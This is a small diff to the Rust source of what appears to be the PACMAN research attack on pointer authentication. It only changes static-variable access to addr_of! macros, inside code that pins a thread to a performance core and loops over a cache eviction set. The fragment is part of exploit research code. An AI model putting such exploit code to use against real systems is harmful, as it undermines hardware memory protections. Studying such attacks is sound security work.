@@ -1,6 +1,8 @@
 /*!
  * The PACMAN attack.
  */
+use std::ptr::{addr_of, addr_of_mut};
+
 use crate::*;
 use crate::pac::*;
 
@@ -1216,7 +1218,7 @@ pub unsafe fn pacman_real(memory_region: &mut [u8]) {
             if !set_core(CoreKind::PCORE) {
                 panic!("Error setting CPU affinity!");
             }
-            write_volatile(&mut PRESSURE_THREAD_STARTED, true);
+            write_volatile(addr_of_mut!(PRESSURE_THREAD_STARTED), true);
             loop {
                 for i in 0..PRESSURE_EVSET.len() {
                     // timer::time_access(limit_evset_chosen_copy[limit_evset_indexes_copy[i]]);
@@ -1231,7 +1233,7 @@ pub unsafe fn pacman_real(memory_region: &mut [u8]) {
         });
     }
 
-    while !read_volatile(&PRESSURE_THREAD_STARTED) {}
+    while !read_volatile(addr_of!(PRESSURE_THREAD_STARTED)) {}
 
     // thread::sleep(core::time::Duration::from_millis(1000));
 
